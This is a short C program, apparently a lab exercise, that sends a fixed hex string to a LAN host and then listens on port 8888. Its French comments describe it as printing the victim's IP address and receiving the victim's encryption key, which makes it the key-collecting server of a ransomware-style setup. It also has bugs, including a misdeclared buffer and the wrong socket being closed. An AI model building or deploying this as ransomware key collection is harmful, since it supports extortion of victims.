#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <netdb.h>
#define BUFFER_SIZE 1024


void handle_error(){
    printf("error\n");
    exit(0);
}
int main (void){
    
    int sockid;
    int server_port = 8888;
    char *server_ip = "192.168.0.143";

    sockid = socket(AF_INET, SOCK_STREAM,0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    char *msg = "84, 0x68, 0x61, 0x74, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x4b, 0x75, 0x6e, 0x67, 0x20, 0x46, 0x75";

    connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr));

    send(sockid,(const char *)msg,strlen(msg),0);
    close(sockid);
    
    
    int sockid2;
    
    
    sockid2 = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr2, client_addr2;
    server_addr2.sin_family = AF_INET;
    server_addr2.sin_port = htons(server_port);
    server_addr2.sin_addr.s_addr = INADDR_ANY;

    char *buffer[BUFFER_SIZE];
    int n, client_socket;
    int bind_result = bind(sockid2, (const struct sockaddr *)&server_addr2, sizeof(server_addr2));

    if(bind_result<0){
        printf("Error during binding");
    }
    else {
        printf("server listening");
        n = listen(sockid2, 1);
        if (n < 0) {
            printf("Error during listen()\n");
            handle_error();
        }
        int len = sizeof(client_addr2);
        client_socket = accept(sockid2, (struct sockaddr *) &client_addr2, &len);

        if (client_socket < 0) {
            printf("Error during accept");
            handle_error();
        }
        printf("Accept connection from %s\n", inet_ntoa(client_addr2.sin_addr)); //affichage de l'adresse ip de la victime
        n = recv(client_socket, (char *) buffer, BUFFER_SIZE, MSG_WAITALL);

        printf("key = %s\n",(char *)buffer);
        //reception et affichage de la clé de chiffrage

    }
    close(sockid);
    
}
